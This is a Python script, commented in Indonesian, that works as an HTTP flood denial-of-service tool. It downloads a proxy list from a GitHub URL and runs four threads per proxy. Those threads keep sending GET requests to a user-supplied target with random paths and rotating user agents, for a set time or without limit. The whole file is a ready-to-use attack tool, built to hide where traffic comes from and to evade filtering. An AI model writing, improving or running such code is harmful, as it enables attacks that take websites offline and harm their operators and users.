#!/usr/bin/env python3
import socket
import threading
import time
import random
import urllib.request
import sys
from urllib.parse import urlparse

# 🔗 Ganti ini dengan RAW URL GitHub lu!
GITHUB_PROXY_URL = "https://raw.githubusercontent.com/rapipppganzz/asoy/main/proxy.txt"

# 🎭 Custom User-Agent (tambah sebanyak lu mau)
CUSTOM_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
    "CustomBot/2.0 (Flood Mode)",
    "Python-urllib/3.10",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

# Path acak biar makin realistis
PATHS = ["/", "/index.html", "/login", "/api", "/wp-admin", "/?q=flood", "/contact"]

request_count = 0
lock = threading.Lock()

def log(msg):
    with lock:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def load_proxies_from_github():
    try:
        log("📥 Mengunduh daftar proxy dari GitHub...")
        with urllib.request.urlopen(GITHUB_PROXY_URL, timeout=10) as resp:
            lines = resp.read().decode('utf-8').splitlines()
        proxies = [line.strip() for line in lines if line.strip() and ":" in line]
        log(f"✅ Berhasil muat {len(proxies)} proxy.")
        return proxies
    except Exception as e:
        log(f"❌ Gagal unduh proxy: {e}")
        sys.exit(1)

def flood(proxy, target_host, target_port, duration):
    global request_count
    try:
        proxy_host, proxy_port_str = proxy.split(":", 1)
        proxy_port = int(proxy_port_str)
    except:
        return  # skip proxy invalid

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((proxy_host, proxy_port))

            # Acak tiap request
            path = random.choice(PATHS)
            ua = random.choice(CUSTOM_UAS)
            req = (
                f"GET http://{target_host}:{target_port}{path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())
            s.recv(1024)  # baca respons singkat
            s.close()

            with lock:
                request_count += 1
                if request_count % 30 == 0:
                    log(f"🔥 Paket ke-{request_count} via {proxy_host}")

        except:
            pass  # diam, lanjut terus

def main():
    print("WELCOME RAPIPPPMODSS")
    print("=" * 50)

    # Input target
    target = input("Masukkan target (HTTP only): ").strip()
    if not target.startswith("http://"):
        target = "http://" + target

    parsed = urlparse(target)
    if not parsed.hostname:
        print("❌ URL tidak valid!")
        return

    host = parsed.hostname
    port = parsed.port or 80

    try:
        duration = int(input("⏱️ Durasi (detik, 0 = tak terbatas): ") or "120")
    except:
        duration = 120

    # Muat proxy dari GitHub
    proxies = load_proxies_from_github()
    if not proxies:
        return

    log(f"🎯 Target: {host}:{port}")
    log(f"🧷 Proxy: {len(proxies)} | Mode: {'Tak terbatas' if duration == 0 else f'{duration} detik'}")

    # 🔥 Jumlah thread: 4 per proxy (bisa naikkan kalau HP kuat)
    THREADS_PER_PROXY = 4
    total_threads = len(proxies) * THREADS_PER_PROXY
    log(f"🌀 Menjalankan {total_threads} thread...")

    threads = []
    for proxy in proxies:
        for _ in range(THREADS_PER_PROXY):
            t = threading.Thread(
                target=flood,
                args=(proxy, host, port, duration if duration > 0 else 3600)
            )
            t.daemon = True
            threads.append(t)
            t.start()

    try:
        if duration == 0:
            while True:
                time.sleep(1)
        else:
            time.sleep(duration)
        log(f"✅ Selesai. Total paket: {request_count}")
    except KeyboardInterrupt:
        log("🛑 Dihentikan oleh pengguna.")

if __name__ == "__main__":
    main()
